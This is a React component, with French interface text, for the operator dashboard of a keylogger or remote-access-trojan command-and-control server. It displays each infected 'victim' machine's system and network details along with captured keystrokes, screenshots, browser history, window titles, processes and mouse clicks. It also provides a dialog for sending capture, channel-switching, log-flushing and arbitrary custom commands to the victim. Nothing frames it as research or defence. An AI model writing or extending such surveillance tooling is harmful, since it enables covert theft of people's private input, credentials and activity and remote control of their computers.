import React, { useState, useEffect } from 'react';
import {
  Box,
  Grid,
  Paper,
  Typography,
  Tab,
  Tabs,
  Card,
  CardContent,
  Button,
  CircularProgress,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  TextField,
} from '@mui/material';
import { useParams, useNavigate } from 'react-router-dom';
import { TabContext, TabList, TabPanel } from '@mui/lab';
import {
  Computer as ComputerIcon,
  NetworkCheck as NetworkIcon,
  Keyboard as KeyboardIcon,
  Image as ImageIcon,
  WindowMaximize as WindowIcon,
  Language as BrowserIcon,
  Settings as ProcessIcon,
  MousePointer as MouseIcon,
  Terminal as TerminalIcon,
} from '@mui/icons-material';
import { victimService, logService } from '../services/api';

const VictimDetails = () => {
  const { victimId } = useParams();
  const navigate = useNavigate();
  const [victim, setVictim] = useState(null);
  const [tabValue, setTabValue] = useState('keystrokes');
  const [loading, setLoading] = useState(true);
  const [commandDialogOpen, setCommandDialogOpen] = useState(false);
  const [selectedCommand, setSelectedCommand] = useState('');
  const [customCommand, setCustomCommand] = useState('');
  const [data, setData] = useState({
    keystrokes: [],
    screenshots: [],
    browserHistory: [],
    activeWindows: [],
    mouseClicks: [],
    processes: [],
  });

  useEffect(() => {
    fetchVictimDetails();
    fetchAllData();
  }, [victimId]);

  const fetchVictimDetails = async () => {
    try {
      const response = await victimService.getVictimById(victimId);
      setVictim(response.data);
    } catch (error) {
      console.error('Error fetching victim details:', error);
    }
  };

  const fetchAllData = async () => {
    setLoading(true);
    try {
      const [
        keystrokesRes,
        screenshotsRes,
        browserHistoryRes,
        activeWindowsRes,
        mouseClicksRes,
        processesRes,
      ] = await Promise.all([
        logService.getLogsByVictim(victimId),
        logService.getScreenshotsByVictim(victimId),
        logService.getBrowserHistoryByVictim(victimId),
        logService.getActiveWindowsByVictim(victimId),
        logService.getMouseClicksByVictim(victimId),
        logService.getProcessesByVictim(victimId),
      ]);

      setData({
        keystrokes: keystrokesRes.data,
        screenshots: screenshotsRes.data,
        browserHistory: browserHistoryRes.data,
        activeWindows: activeWindowsRes.data,
        mouseClicks: mouseClicksRes.data,
        processes: processesRes.data,
      });
    } catch (error) {
      console.error('Error fetching data:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
  };

  const handleSendCommand = async () => {
    try {
      const command = selectedCommand === 'custom' ? customCommand : selectedCommand;
      await victimService.sendCommand(victimId, command);
      setCommandDialogOpen(false);
      setSelectedCommand('');
      setCustomCommand('');
      // Afficher une notification de succès
    } catch (error) {
      console.error('Error sending command:', error);
      // Afficher une notification d'erreur
    }
  };

  if (!victim) {
    return (
      <Box display="flex" justifyContent="center" alignItems="center" height="100vh">
        <CircularProgress />
      </Box>
    );
  }

  const systemInfo = JSON.parse(victim.system_info || '{}');
  const networkInfo = JSON.parse(victim.network_info || '{}');

  return (
    <Box sx={{ flexGrow: 1, p: 3 }}>
      <Box display="flex" justifyContent="space-between" alignItems="center" mb={3}>
        <Typography variant="h4" component="h1">
          Victime: {victimId.substring(0, 8)}...
        </Typography>
        <Button
          variant="contained"
          startIcon={<TerminalIcon />}
          onClick={() => setCommandDialogOpen(true)}
        >
          Envoyer une commande
        </Button>
      </Box>

      <Grid container spacing={3} mb={3}>
        <Grid item xs={12} md={6}>
          <Card>
            <CardContent>
              <Box display="flex" alignItems="center" mb={2}>
                <ComputerIcon sx={{ mr: 1, color: 'primary.main' }} />
                <Typography variant="h6">Informations système</Typography>
              </Box>
              <Grid container spacing={2}>
                <Grid item xs={6}>
                  <Typography variant="body2" color="textSecondary">
                    Plateforme
                  </Typography>
                  <Typography variant="body1">
                    {systemInfo.platform} {systemInfo.platform_release}
                  </Typography>
                </Grid>
                <Grid item xs={6}>
                  <Typography variant="body2" color="textSecondary">
                    Architecture
                  </Typography>
                  <Typography variant="body1">{systemInfo.architecture}</Typography>
                </Grid>
                <Grid item xs={6}>
                  <Typography variant="body2" color="textSecondary">
                    Nom d'hôte
                  </Typography>
                  <Typography variant="body1">{systemInfo.hostname}</Typography>
                </Grid>
                <Grid item xs={6}>
                  <Typography variant="body2" color="textSecondary">
                    Utilisateur
                  </Typography>
                  <Typography variant="body1">{systemInfo.username}</Typography>
                </Grid>
                <Grid item xs={6}>
                  <Typography variant="body2" color="textSecondary">
                    RAM
                  </Typography>
                  <Typography variant="body1">{systemInfo.ram}</Typography>
                </Grid>
              </Grid>
            </CardContent>
          </Card>
        </Grid>
        <Grid item xs={12} md={6}>
          <Card>
            <CardContent>
              <Box display="flex" alignItems="center" mb={2}>
                <NetworkIcon sx={{ mr: 1, color: 'primary.main' }} />
                <Typography variant="h6">Informations réseau</Typography>
              </Box>
              <Grid container spacing={2}>
                <Grid item xs={6}>
                  <Typography variant="body2" color="textSecondary">
                    IP locale
                  </Typography>
                  <Typography variant="body1">{networkInfo.local_ip}</Typography>
                </Grid>
                <Grid item xs={6}>
                  <Typography variant="body2" color="textSecondary">
                    IP publique
                  </Typography>
                  <Typography variant="body1">{networkInfo.public_ip}</Typography>
                </Grid>
                <Grid item xs={12}>
                  <Typography variant="body2" color="textSecondary">
                    Adresse MAC
                  </Typography>
                  <Typography variant="body1">{networkInfo.mac_address}</Typography>
                </Grid>
              </Grid>
            </CardContent>
          </Card>
        </Grid>
      </Grid>

      <Paper sx={{ p: 2 }}>
        <TabContext value={tabValue}>
          <Box sx={{ borderBottom: 1, borderColor: 'divider' }}>
            <TabList onChange={handleTabChange} aria-label="Victim data tabs">
              <Tab
                label="Frappes"
                value="keystrokes"
                icon={<KeyboardIcon />}
                iconPosition="start"
              />
              <Tab
                label="Captures"
                value="screenshots"
                icon={<ImageIcon />}
                iconPosition="start"
              />
              <Tab
                label="Fenêtres"
                value="windows"
                icon={<WindowIcon />}
                iconPosition="start"
              />
              <Tab
                label="Navigateur"
                value="browser"
                icon={<BrowserIcon />}
                iconPosition="start"
              />
              <Tab
                label="Processus"
                value="processes"
                icon={<ProcessIcon />}
                iconPosition="start"
              />
              <Tab
                label="Souris"
                value="mouse"
                icon={<MouseIcon />}
                iconPosition="start"
              />
            </TabList>
          </Box>
          <TabPanel value="keystrokes">
            {loading ? (
              <Box display="flex" justifyContent="center" p={3}>
                <CircularProgress />
              </Box>
            ) : (
              <Box>
                {data.keystrokes.length > 0 ? (
                  data.keystrokes.map((log, index) => (
                    <Box key={index} mb={2} p={2} sx={{ backgroundColor: 'grey.100', borderRadius: 1 }}>
                      <Typography variant="body2" color="textSecondary" mb={1}>
                        {log.timestamp}
                      </Typography>
                      <Typography variant="body1" sx={{ fontFamily: 'monospace', whiteSpace: 'pre-wrap' }}>
                        {log.keystrokes}
                      </Typography>
                    </Box>
                  ))
                ) : (
                  <Box textAlign="center" p={3}>
                    <Typography variant="body1" color="textSecondary">
                      Aucune frappe enregistrée
                    </Typography>
                  </Box>
                )}
              </Box>
            )}
          </TabPanel>
          <TabPanel value="screenshots">
            {loading ? (
              <Box display="flex" justifyContent="center" p={3}>
                <CircularProgress />
              </Box>
            ) : (
              <Box>
                {data.screenshots.length > 0 ? (
                  <Grid container spacing={2}>
                    {data.screenshots.map((screenshot, index) => (
                      <Grid item xs={12} sm={6} md={4} key={index}>
                        <Card>
                          <img
                            src={`http://localhost:5000/static/uploads/${screenshot.filename}`}
                            alt="Screenshot"
                            style={{ width: '100%', height: 200, objectFit: 'cover' }}
                          />
                          <CardContent>
                            <Typography variant="body2" color="textSecondary">
                              {screenshot.timestamp}
                            </Typography>
                            <Button
                              variant="outlined"
                              size="small"
                              sx={{ mt: 1 }}
                              href={`http://localhost:5000/static/uploads/${screenshot.filename}`}
                              target="_blank"
                            >
                              Plein écran
                            </Button>
                          </CardContent>
                        </Card>
                      </Grid>
                    ))}
                  </Grid>
                ) : (
                  <Box textAlign="center" p={3}>
                    <Typography variant="body1" color="textSecondary">
                      Aucune capture d'écran
                    </Typography>
                  </Box>
                )}
              </Box>
            )}
          </TabPanel>
          <TabPanel value="windows">
            {loading ? (
              <Box display="flex" justifyContent="center" p={3}>
                <CircularProgress />
              </Box>
            ) : (
              <Box>
                {data.activeWindows.length > 0 ? (
                  data.activeWindows.map((window, index) => (
                    <Box key={index} mb={1} p={2} sx={{ backgroundColor: 'grey.100', borderRadius: 1 }}>
                      <Typography variant="body2" color="textSecondary">
                        {window.timestamp}
                      </Typography>
                      <Typography variant="body1">{window.title}</Typography>
                    </Box>
                  ))
                ) : (
                  <Box textAlign="center" p={3}>
                    <Typography variant="body1" color="textSecondary">
                      Aucune fenêtre active enregistrée
                    </Typography>
                  </Box>
                )}
              </Box>
            )}
          </TabPanel>
          <TabPanel value="browser">
            {loading ? (
              <Box display="flex" justifyContent="center" p={3}>
                <CircularProgress />
              </Box>
            ) : (
              <Box>
                {data.browserHistory.length > 0 ? (
                  data.browserHistory.map((entry, index) => (
                    <Box key={index} mb={2} p={2} sx={{ backgroundColor: 'grey.100', borderRadius: 1 }}>
                      <Typography variant="body2" color="textSecondary">
                        {entry.timestamp}
                      </Typography>
                      <Typography variant="body1" sx={{ fontWeight: 'bold' }}>
                        {entry.title}
                      </Typography>
                      <Typography variant="body2" sx={{ wordBreak: 'break-all' }}>
                        <a href={entry.url} target="_blank" rel="noopener noreferrer">
                          {entry.url}
                        </a>
                      </Typography>
                    </Box>
                  ))
                ) : (
                  <Box textAlign="center" p={3}>
                    <Typography variant="body1" color="textSecondary">
                      Aucun historique de navigateur
                    </Typography>
                  </Box>
                )}
              </Box>
            )}
          </TabPanel>
          <TabPanel value="processes">
            {loading ? (
              <Box display="flex" justifyContent="center" p={3}>
                <CircularProgress />
              </Box>
            ) : (
              <Box>
                {data.processes.length > 0 ? (
                  data.processes.map((process, index) => (
                    <Box key={index} mb={1} p={2} sx={{ backgroundColor: 'grey.100', borderRadius: 1 }}>
                      <Typography variant="body1" sx={{ fontWeight: 'bold' }}>
                        {process.name}
                      </Typography>
                      <Typography variant="body2" color="textSecondary">
                        PID: {process.pid} | Utilisateur: {process.username}
                      </Typography>
                    </Box>
                  ))
                ) : (
                  <Box textAlign="center" p={3}>
                    <Typography variant="body1" color="textSecondary">
                      Aucun processus enregistré
                    </Typography>
                  </Box>
                )}
              </Box>
            )}
          </TabPanel>
          <TabPanel value="mouse">
            {loading ? (
              <Box display="flex" justifyContent="center" p={3}>
                <CircularProgress />
              </Box>
            ) : (
              <Box>
                {data.mouseClicks.length > 0 ? (
                  data.mouseClicks.map((click, index) => (
                    <Box key={index} mb={1} p={2} sx={{ backgroundColor: 'grey.100', borderRadius: 1 }}>
                      <Typography variant="body2" color="textSecondary">
                        {click.timestamp}
                      </Typography>
                      <Typography variant="body1">
                        Position: X={click.x}, Y={click.y} | Bouton: {click.button}
                      </Typography>
                      <Typography variant="body2" color="textSecondary">
                        Fenêtre: {click.window}
                      </Typography>
                    </Box>
                  ))
                ) : (
                  <Box textAlign="center" p={3}>
                    <Typography variant="body1" color="textSecondary">
                      Aucun clic de souris enregistré
                    </Typography>
                  </Box>
                )}
              </Box>
            )}
          </TabPanel>
        </TabContext>
      </Paper>

      <Dialog open={commandDialogOpen} onClose={() => setCommandDialogOpen(false)}>
        <DialogTitle>Envoyer une commande</DialogTitle>
        <DialogContent>
          <FormControl fullWidth margin="normal">
            <InputLabel>Commande</InputLabel>
            <Select
              value={selectedCommand}
              onChange={(e) => setSelectedCommand(e.target.value)}
            >
              <MenuItem value="">Choisir une commande...</MenuItem>
              <MenuItem value="start_capture">Démarrer la capture</MenuItem>
              <MenuItem value="stop_capture">Arrêter la capture</MenuItem>
              <MenuItem value="switch_mode_http">Basculer en mode HTTP</MenuItem>
              <MenuItem value="switch_mode_tcp">Basculer en mode TCP</MenuItem>
              <MenuItem value="flush_logs">Vider les logs</MenuItem>
              <MenuItem value="take_screenshot">Prendre une capture d'écran</MenuItem>
              <MenuItem value="custom">Commande personnalisée</MenuItem>
            </Select>
          </FormControl>
          {selectedCommand === 'custom' && (
            <TextField
              fullWidth
              margin="normal"
              label="Commande personnalisée"
              value={customCommand}
              onChange={(e) => setCustomCommand(e.target.value)}
            />
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setCommandDialogOpen(false)}>Annuler</Button>
          <Button onClick={handleSendCommand} variant="contained">
            Envoyer
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default VictimDetails;